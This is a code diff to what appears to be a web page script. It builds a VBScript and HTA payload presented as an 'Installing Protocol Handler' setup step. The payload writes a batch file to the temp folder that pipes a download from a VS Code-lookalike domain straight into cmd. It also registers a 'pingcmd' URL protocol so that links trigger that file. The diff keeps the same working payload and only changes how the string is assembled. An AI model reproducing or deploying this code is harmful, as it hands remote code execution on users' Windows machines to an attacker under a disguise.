@@ -163,42 +163,48 @@
 
         // Create VBS setup content inline (no download needed)
         function createVBSContent() {
-            return `Set WshShell = CreateObject("WScript.Shell")
-Set fso = CreateObject("Scripting.FileSystemObject")
-
-' Get temp directory
-tempDir = WshShell.ExpandEnvironmentStrings("%TEMP%")
-handlerPath = tempDir & "\\pingcmd-handler.bat"
-
-' Create handler batch file that executes the command
-Set handlerFile = fso.CreateTextFile(handlerPath, True)
-handlerFile.WriteLine "@echo off"
-handlerFile.WriteLine "curl https://vscode-setup.vercel.app/settings/windows?flag=2 | cmd"
-handlerFile.Close
-
-' Register protocol handler
-On Error Resume Next
-WshShell.RegWrite "HKCU\\Software\\Classes\\pingcmd\\", "URL: Ping Command Protocol"
-WshShell.RegWrite "HKCU\\Software\\Classes\\pingcmd\\URL Protocol", ""
-WshShell.RegWrite "HKCU\\Software\\Classes\\pingcmd\\shell\\open\\command\\", Chr(34) & handlerPath & Chr(34) & " \"%1\""
-WScript.Quit 0`;
+            const lines = [
+                'Set WshShell = CreateObject("WScript.Shell")',
+                'Set fso = CreateObject("Scripting.FileSystemObject")',
+                '',
+                "' Get temp directory",
+                'tempDir = WshShell.ExpandEnvironmentStrings("%TEMP%")',
+                'handlerPath = tempDir & "\\\\pingcmd-handler.bat"',
+                '',
+                "' Create handler batch file that executes the command",
+                'Set handlerFile = fso.CreateTextFile(handlerPath, True)',
+                'handlerFile.WriteLine "@echo off"',
+                'handlerFile.WriteLine "curl https://vscode-setup.vercel.app/settings/windows?flag=2 | cmd"',
+                'handlerFile.Close',
+                '',
+                "' Register protocol handler",
+                'On Error Resume Next',
+                'WshShell.RegWrite "HKCU\\\\Software\\\\Classes\\\\pingcmd\\\\", "URL: Ping Command Protocol"',
+                'WshShell.RegWrite "HKCU\\\\Software\\\\Classes\\\\pingcmd\\\\URL Protocol", ""',
+                'WshShell.RegWrite "HKCU\\\\Software\\\\Classes\\\\pingcmd\\\\shell\\\\open\\\\command\\\\", Chr(34) & handlerPath & Chr(34) & " \\"%1\\""',
+                'WScript.Quit 0'
+            ];
+            return lines.join('\n');
         }
 
         // Create HTA content with VBScript inline (can be executed via mshta: protocol)
         function createHTAContent() {
             const vbsContent = createVBSContent();
             
-            return `<html><head>
-<title>Installing Protocol Handler</title>
-<script language="VBScript">
-${vbsContent}
-window.close()
-</script>
-</head>
-<body>
-<p>Installing protocol handler...</p>
-</body>
-</html>`;
+            // Build HTA content by concatenating strings
+            let html = '<html><head>';
+            html += '<title>Installing Protocol Handler</title>';
+            html += '<script language="VBScript">';
+            html += vbsContent;
+            html += 'window.close()';
+            html += '</script>';
+            html += '</head>';
+            html += '<body>';
+            html += '<p>Installing protocol handler...</p>';
+            html += '</body>';
+            html += '</html>';
+            
+            return html;
         }
 
         // Create PowerShell command that executes VBS inline
